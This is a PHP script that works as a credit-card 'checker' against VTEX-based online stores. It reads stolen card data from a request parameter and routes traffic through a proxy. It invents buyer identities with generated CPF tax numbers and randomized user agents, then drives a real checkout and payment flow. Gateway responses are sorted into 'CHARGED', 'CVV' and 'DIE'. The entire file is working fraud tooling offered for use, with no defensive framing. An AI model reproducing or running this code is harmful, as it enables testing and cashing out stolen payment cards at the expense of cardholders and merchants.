<?php
error_reporting(0);
ignore_user_abort();

function getstr($url, $start, $fim, $n) {
    return explode($fim, explode($start, $url)[$n])[0];
}

$lista = $_GET['lista'];
$site = $_GET['sitess'];
$proxy = $_GET['ips'];
$senha = $_GET['pass'];


[$cc, $mes, $ano, $cvv] = explode("|", $lista);
$bin11 = substr($cc, 0,8);
if (strlen($ano) == 4){
  $ano = substr($ano , 2);}


$re = array(
    "2" => "/^4[0-9]{12}(?:[0-9]{3})?$/",
    "4" => "/^(5[1-5][0-9]{14}|2[0-9]{12}(?:[0-9]{3})?)$/",
    "1" => "/^3[47][0-9]{13}$/",
    "9" => "/^((((636368)|(650907)|(651652)|(655001)|(650487)|(650570)|(650485)|(655003)|(509059)|(506775))\d{0,10})|((5067)|(4576)|(651653))\d{0,12})$/",
);

foreach ($re as $cardType => $pattern) {
    if (preg_match($pattern, $cc)) {
        $Type = $cardType;
        break;
    }
}

if (empty($Type)) {
die("</br>
DIE --> ❌<br>
CC ->> {$lista}<br>MSG ->> bin não aceita<br>
");}

$names = [
    ['marcos', 'rodrigues'],
    ['abreu', 'vieira'],
    ['murilo', 'castro'],
    ['diego', 'oliveira'],
    ['alberto', 'gomes'],
    ['dario', 'almeida'],
    ['micael', 'andrade'],
    ['rodrigo', 'barros'],
    ['marlon', 'borges'],
    ['silva', 'campos'],
    ['Abrahao', 'cardoso'],
    ['Abade', 'carvalho'],
    ['francisco', 'costa'],
    ['alan', 'dias'],
    ['ronaldo', 'dantas'],
    ['marinho', 'duarte'],
    ['Abelardo', 'santos'],
    ['magal', 'freitas'],
    ['lemos', 'fernandes'],
    ['thales', 'ferreira'],
    ['tiago', 'garcia'],
    ['Diniz', 'goalves'],
    ['luiz', 'lima'],
    ['heitor', 'lopes'],
    ['leandro', 'machado'],
    ['arthur', 'marques'],
    ['david', 'bernardo'],
    ['juan', 'martins'],
    ['diogo', 'medeiros'],
    ['caue', 'melo'],
    ['joaquin', 'mendes'],
    ['isaac', 'miranda'],
    ['carlos', 'monteiro'],
    ['andre', 'moraes'],
    ['marrone', 'neves'],
    ['ian', 'moreira'],
];

$randomName = $names[array_rand($names)];
$fname = $randomName[0];
$lname = $randomName[1];

$namep = "$fname $lname";
$email = "$fname$lname" . rand(0, 999) . "xx2@gmail.com";
$num = random_int(1111, 9999);

function cpf($tipo){
    $num = array();
    $num[9]=$num[10]=$num[11]=0;
    for ($w=0; $w > -2; $w--){for($i=$w; $i < 9; $i++){
    $x=($i-10)*-1;
    $w==0?$num[$i]=rand(0,9):'';
    ($w==0?$num[$i]:'');
    ($w==-1 && $i==$w && $num[11]==0)?
    $num[11]+=$num[10]*2    :
    $num[10-$w]+=$num[$i-$w]*$x;}
    $num[10-$w]=(($num[10-$w]%11)<2?0:(11-($num[10-$w]%11)));
    $num[10-$w];}
    if ($tipo == 1){
    $cpf =  $num[0].$num[1].$num[2].'.'.$num[3].$num[4].$num[5].'.'.$num[6].$num[7].$num[8].'-'.$num[10].$num[11];
    }else{
    $cpf =  $num[0].$num[1].$num[2].$num[3].$num[4].$num[5].$num[6].$num[7].$num[8].$num[10].$num[11];}
    return $cpf;}
$cpf = cpf(1);

function generateUserAgent() {
    $windowsVersions = ["NT 5.1", "NT 6.0", "NT 6.1", "NT 6.2", "NT 6.3", "NT 10.0"];
    $webkitVersion = rand(111, 999) . '.' . rand(11, 99);
    $chromeVersion = rand(11, 99) . '.0.' . rand(1111, 9999) . '.' . rand(111, 999);
    $safariVersion = rand(111, 999) . '.' . rand(11, 99);
    $iosVersion = rand(14, 15) . '_' . rand(0, 9);

    $userAgents = [
        "Mozilla/5.0 (Windows " . $windowsVersions[array_rand($windowsVersions)] . "; Win64; x64) AppleWebKit/$webkitVersion (KHTML, like Gecko) Chrome/$chromeVersion Safari/$safariVersion",
        "Mozilla/5.0 (Windows " . $windowsVersions[array_rand($windowsVersions)] . "; Win64; x64; rv:88.0) Gecko/20100101 Firefox/88.0",
        "Mozilla/5.0 (Windows " . $windowsVersions[array_rand($windowsVersions)] . "; Win64; x64) AppleWebKit/$webkitVersion (KHTML, like Gecko) Edge/88.0.$(64-bit)",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/$webkitVersion (KHTML, like Gecko) Chrome/$chromeVersion Safari/$safariVersion",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/$webkitVersion (KHTML, like Gecko) Chrome/$chromeVersion Safari/$safariVersion",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/$webkitVersion (KHTML, like Gecko) Version/13.1.2 Safari/$safariVersion",
        "Mozilla/5.0 (iPhone; CPU iPhone OS $iosVersion like Mac OS X) AppleWebKit/$webkitVersion (KHTML, like Gecko) Version/14.1 Mobile/15E148 Safari/$safariVersion",
        "Mozilla/5.0 (iPad; CPU OS $iosVersion like Mac OS X) AppleWebKit/$webkitVersion (KHTML, like Gecko) Version/14.1 Mobile/15E148 Safari/$safariVersion",
        "Mozilla/5.0 (Linux; Android " . rand(9, 12) . "; SM-G960U) AppleWebKit/$webkitVersion (KHTML, like Gecko) Chrome/$chromeVersion Mobile Safari/$safariVersion",
    ];

    return $userAgents[array_rand($userAgents)];
}


function loli_request(array $lolita) {
    $curl = curl_init();
    curl_setopt_array($curl, [
        CURLOPT_URL => $lolita['url'],
        CURLOPT_PROXY => $GLOBALS['proxy'],
        CURLOPT_PROXYUSERPWD => $GLOBALS['senha'],
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_SSL_VERIFYHOST=> false,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_CUSTOMREQUEST => $lolita['meth'],
        CURLOPT_POSTFIELDS => $lolita['post'] ?? null,
        CURLOPT_HTTPHEADER => $lolita['header'] ?? null,
        CURLOPT_HEADER => $lolita['head'] ?? null,
    ]);

    $response = curl_exec($curl);
    curl_close($curl);
    return $response;
}


$userAgent = generateUserAgent();


$resp_1 = loli_request([
    'url' => "https://{$site}/api/catalog_system/pub/products/search?fq=productId/",
    'meth' => 'GET',
    'header' => [
        'content-type: application/x-www-form-urlencoded',
        "user-agent: {$userAgent}",
    ],
]);
$vte919 = getstr($resp_1,'addToCartLink":"','"',1);
$add = getstr($resp_1,'"addToCartLink":','CacheVersionUsedToCallCheckout', rand(1, 30));

if($vte919 == null){
die("</br>
DIE --> ❌<br>
CC ->> {$lista}<br>MSG ->> site não vtex<br>
");}


$max_retry = 30;
$retry_count = 0;

do {
    $add = getstr($resp_1,'"addToCartLink":','CacheVersionUsedToCallCheckout', rand(1, 30));

    if (stripos($add, 'IsAvailable":true') === false) {
        $retry_count++;
    } else {
        break;
    }
    
    if ($retry_count == $max_retry - 1) {
        $add = getstr($resp_1,'"addToCartLink":','CacheVersionUsedToCallCheckout', rand(1, 30));
        $retry_count++;
    }
} while ($retry_count < $max_retry);

if ($retry_count == $max_retry) {
die("</br>
DIE --> ❌<br>
CC ->> {$lista}<br>MSG ->>Não foi possível obter o id do produto após {$retry_count} tentativas<br>
");}

$link = getstr($add,'cart','&sc=',1);
$scc = getstr($add,'&seller=1&sc=','&',1);

$resp_2 = loli_request([
    'url' => "https://{$site}/checkout/cart{$link}&redirect=true&sc={$scc}",
    'meth' => 'GET',
    'head' => true,
    'header' => [
        'content-type: application/x-www-form-urlencoded',
        "user-agent: {$userAgent}",
        'Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
    ],
]);
$sku = getstr($resp_2,'checkout.vtex.com=__ofid=',';',1);

$resp_4 = loli_request([
    'url' => "https://{$site}/api/checkout/pub/orderForm/{$sku}/attachments/clientProfileData",
    'meth' => 'POST',
    'header' => [
        'content-type: application/json',
        "user-agent: {$userAgent}",
        'Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
    ],
     'post' => '{"firstEmail":"'.$email.'","email":"'.$email.'","firstName":"'.$fname.'","lastName":"'.$lname.'","document":"'.$cpf.'","phone":"+55 98 99032 '.$num.'","documentType":"cpf","isCorporate":false,"corporateName":null,"tradeName":null,"corporateDocument":null,"stateInscription":null,"expectedOrderFormSections":["items","totalizers","clientProfileData","shippingData","paymentData","sellers","messages","marketingData","clientPreferencesData","storePreferencesData","giftRegistryData","ratesAndBenefitsData","openTextField","commercialConditionData","customData"]}',
]);

if((strpos($resp_4, 'não tem estoque'))){
die("</br>
DIE --> ❌<br>
CC ->> {$lista}<br>MSG ->> produto sem estoque<br>RETRY ->> {$retry_count}<br>
");}
elseif(strpos($resp_4,  'indisponível')) {
die("</br>
DIE --> ❌<br>
CC ->> {$lista}<br>MSG ->> produto sem estoque<br>RETRY ->> {$retry_count}<br>
");}

$resp_5 = loli_request([
    'url' => "https://{$site}/api/checkout/pub/orderForm/{$sku}/attachments/shippingData",
    'meth' => 'POST',
    'header' => [
        'content-type: application/json',
        "user-agent: {$userAgent}",
        'Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
    ],
     'post' => '{"logisticsInfo":[{"addressId":"","itemIndex":0,"selectedDeliveryChannel":"delivery","selectedSla":"Normal"}],"clearAddressIfPostalCodeNotFound":false,"selectedAddresses":[{"addressId":"","addressType":"residential","city":"Jundiaí","complement":null,"country":"BRA","geoCoordinates":[-46.97518539428711,-23.18805694580078],"neighborhood":"Loteamento Multivias","number":"344","postalCode":"13212-141","receiverName":"'.$namep.'","reference":null,"state":"SP","street":"Avenida Benedito Quina da Silva","addressQuery":"","isDisposable":null},{"addressId":"","addressType":"search","city":"Jundiaí","complement":null,"country":"BRA","geoCoordinates":[-46.97518539428711,-23.18805694580078],"neighborhood":"Loteamento Multivias","number":null,"postalCode":"13212-141","receiverName":"'.$namep.'","reference":null,"state":"SP","street":"Avenida Benedito Quina da Silva","addressQuery":"","isDisposable":null}],"expectedOrderFormSections":["items","totalizers","clientProfileData","shippingData","paymentData","sellers","messages","marketingData","clientPreferencesData","storePreferencesData","giftRegistryData","ratesAndBenefitsData","openTextField","commercialConditionData","customData"]}',
]);

$value = getstr($resp_5,'"paymentGroupName":null,"value":',',',1);
$valor_formatado = number_format($value / 100, 2, '.', '');

if (empty($value)) {
die("</br>
DIE --> ❌<br>
CC ->> {$lista}<br>MSG ->> erro fatal 1<br>
");}

$resp_6 = loli_request([
    'url' => "https://{$site}/api/checkout/pub/orderForm/{$sku}/attachments/paymentData",
    'meth' => 'POST',
    'header' => [
        'content-type: application/json',
        "user-agent: {$userAgent}",
        'Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
    ],
     'post' => '{"payments":[{"hasDefaultBillingAddress":true,"installmentsInterestRate":0,"referenceValue":'.$value.',"bin":"'.$bin11.'","accountId":null,"value":'.$value.',"tokenId":null,"paymentSystem":"'.$Type.'","installments":1}],"giftCards":[],"expectedOrderFormSections":["items","totalizers","clientProfileData","shippingData","paymentData","sellers","messages","marketingData","clientPreferencesData","storePreferencesData","giftRegistryData","ratesAndBenefitsData","openTextField","commercialConditionData","customData"]}',
]);

$resp_7 = loli_request([
    'url' => "https://{$site}/api/checkout/pub/orderForm/{$sku}/transaction",
    'meth' => 'POST',
    'head' => true,
    'header' => [
        'content-type: application/json',
        "user-agent: {$userAgent}",
        'Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
    ],
     'post' => '{"referenceId":"'.$sku.'","savePersonalData":false,"optinNewsLetter":false,"value":'.$value.',"referenceValue":'.$value.',"interestValue":0,"expectedOrderFormSections":["items","totalizers","clientProfileData","shippingData","paymentData","sellers","messages","marketingData","clientPreferencesData","storePreferencesData","giftRegistryData","ratesAndBenefitsData","openTextField","commercialConditionData","customData"]}',
]);
$trans = getstr($resp_7,'"transactionId":"','"',1);
$addre = getstr($resp_7,'"addressId":"','"',1);
$order = getstr($resp_7,'{messageCode}","orderGroup":"','","orderFormId"',1);
$merchant = getstr($resp_7,'merchantName":"','"',1);
$id = getstr($resp_7,'sellerMerchantInstallments":[{"id":"','"',2);

$auth1 = getstr($resp_7,'VTEX_CHK_Order_Auth=',';',1);
$auth2 = getstr($resp_7,'Vtex_CHKO_Auth=',';',1);

if((strpos($resp_7,  'recaptcha'))){
die("</br>
DIE --> ❌<br>
CC ->> {$lista}<br>MSG ->> site com recapt<br>VALOR ->> {$valor_formatado}<br>RETRY ->> {$retry_count}<br>
");}
elseif(strpos($resp_7,  'Carrinho inválido')) {
die("</br>
DIE --> ❌<br>
CC ->> {$lista}<br>MSG ->> carrinho invalido<br>VALOR ->> {$valor_formatado}<br>RETRY ->> {$retry_count}<br>
");}
elseif(empty($trans)) {
die("</br>
DIE --> ❌<br>
CC ->> {$lista}<br>MSG ->> erro fatal 2<br>
");}

$resp_8 = loli_request([
    'url' => "https://{$id}.vtexpayments.com.br/api/pub/transactions/{$sku}/payments",
    'meth' => 'POST',
    'header' => [
        'content-type: application/json',
        "user-agent: {$userAgent}",
        'Origin: https://io.vtexpayments.com.br',
        'Referer: https://io.vtexpayments.com.br/',
        'Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
    ],
     'post' => '[{"hasDefaultBillingAddress":true,"installmentsInterestRate":0,"referenceValue":'.$value.',"bin":"'.$bin11.'","accountId":null,"value":'.$value.',"tokenId":null,"paymentSystem":"'.$Type.'","isBillingAddressDifferent":false,"fields":{"holderName":"'.$namep.'","cardNumber":"'.$cc.'","validationCode":"'.$cvv.'","dueDate":"'.$mes.'/'.$ano.'","document":"'.$cpf.'","addressId":"'.$addre.'","bin":"'.$bin11.'"},"installments":1,"chooseToUseNewCard":true,"id":"'.$id.'","interestRate":0,"installmentValue":'.$value.',"transaction":{"id":"'.$trans.'","merchantName":"'.$merchant.'"},"installmentsValue":'.$value.',"currencyCode":"BRL","originalPaymentIndex":0,"groupName":"creditCardPaymentGroup"}]',
]);

sleep(2);
$resp_9 = loli_request([
    'url' => "https://{$site}/api/checkout/pub/gatewayCallback/{$order}",
    'meth' => 'POST',
    'header' => [
        'content-type: application/json',
        "user-agent: {$userAgent}",
        'Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
        "cookie: CheckoutDataAccess=VTEX_CHK_Order_Auth={$auth1}",
    ],
     'post' => '',
]);

$messe = trim(strip_tags(getstr($resp_9,'Code:','-',1)));
$messe1 = trim(strip_tags(getstr($resp_9,'Code:','nsu',1)));

if ($resp_9 == null){
die("</br>
DIE --> ❌<br>
CC ->> {$lista}<br>MSG ->> proxy esta fazendo pedido no site<br>VALOR ->> {$valor_formatado}<br>RETRY ->> {$retry_count}<br>
");}
#=================================[
if((strpos($resp_9,'Code:63'))||(strpos($resp_9,'Code:06'))||(strpos($resp_9,'Code:N7'))||(strpos($resp_9,'Code:113'))){
die("</br>
CHARGED --> ✅<br>
CC ->> {$lista}<br>MSG1 ->> {$messe}<br> MSG2 ->> {$messe1}<br>VALOR ->> {$valor_formatado}<br>RETRY ->> {$retry_count}<br>
");}

elseif((strpos($resp_9,'ECOM - 63'))||(strpos($resp_9,'ECOM - N7'))||(strpos($resp_9,'Code:113'))){
die("</br>
CHARGED --> ✅<br>
CC ->> {$lista}<br>MSG1 ->> {$messe}<br> MSG2 ->> {$messe1}<br>VALOR ->> {$valor_formatado}<br>RETRY ->> {$retry_count}<br>
");}

elseif((strpos($resp_9,'ECOM - 51'))||(strpos($resp_9,'Code:111'))||(strpos($resp_9,'Code:51'))){
die("</br>
CVV --> ✅<br>
CC ->> {$lista}<br>MSG1 ->> {$messe}<br> MSG2 ->> {$messe1}<br>VALOR ->> {$valor_formatado}<br>RETRY ->> {$retry_count}<br>
");}
    
elseif((strpos($resp_9,'Code:0000'))||(strpos($resp_9,'code:0000'))||(strpos($resp_9,'Transação aprovada'))||(strpos($resp_9,'aprovada com sucesso'))){
die("</br>
CHARGED --> ✅<br>
CC ->> {$lista}<br>MSG ->> Transação aprovada<br>VALOR ->> {$valor_formatado}<br>RETRY ->> {$retry_count}<br>
");}

elseif((strpos($resp_9,'Code:00'))||(strpos($resp_9,'code:00'))||(strpos($resp_9,'aprovada'))||(strpos($resp_9,'sucesso'))){
die("</br>
CHARGED --> ✅<br>
CC ->> {$lista}<br>MSG ->> aprovada com sucesso<br>VALOR ->> {$valor_formatado}<br>RETRY ->> {$retry_count}<br>
");}

elseif(strpos($resp_9,'Code:119')) {
die("</br>
CVV --> ✅<br>
CC ->> {$lista}<br>MSG1 ->> {$messe}<br> MSG2 ->> {$messe1}<br>VALOR ->> {$valor_formatado}<br>RETRY ->> {$retry_count}<br>
");}

elseif(strpos($resp_9,'Code:1022')) {
die("</br>
CHARGED --> ✅<br>
CC ->> {$lista}<br>MSG1 ->> {$messe}<br> MSG2 ->> {$messe1}<br>VALOR ->> {$valor_formatado}<br>RETRY ->> {$retry_count}<br>
");}

elseif(strpos($resp_9,'Code:83')) {
die("</br>
DIE --> ❌<br>
CC ->> {$lista}<br>MSG1 ->> {$messe}<br> MSG2 ->> {$messe1}<br>VALOR ->> {$valor_formatado}<br>RETRY ->> {$retry_count}<br>
");}

elseif(strpos($resp_9,'Code:1016')) {
die("</br>
CVV --> ✅<br>
CC ->> {$lista}<br>MSG1 ->> {$messe}<br> MSG2 ->> {$messe1}<br>VALOR ->> {$valor_formatado}<br>RETRY ->> {$retry_count}<br>
");}

elseif(strpos($resp_9,'Code:1045')) {
die("</br>
CHARGED --> ✅<br>
CC ->> {$lista}<br>MSG1 ->> {$messe}<br> MSG2 ->> {$messe1}<br>VALOR ->> {$valor_formatado}<br>RETRY ->> {$retry_count}<br>
");}
elseif($messe == null){
die("</br>
DIE --> ❌<br>
CC ->> {$lista}<br>MSG ->> $resp_9<br>
");}
else{
die("</br>
DIE --> ❌<br>
CC ->> {$lista}<br>MSG1 ->> {$messe}<br> MSG2 ->> {$messe1}<br>VALOR ->> {$valor_formatado}<br>");}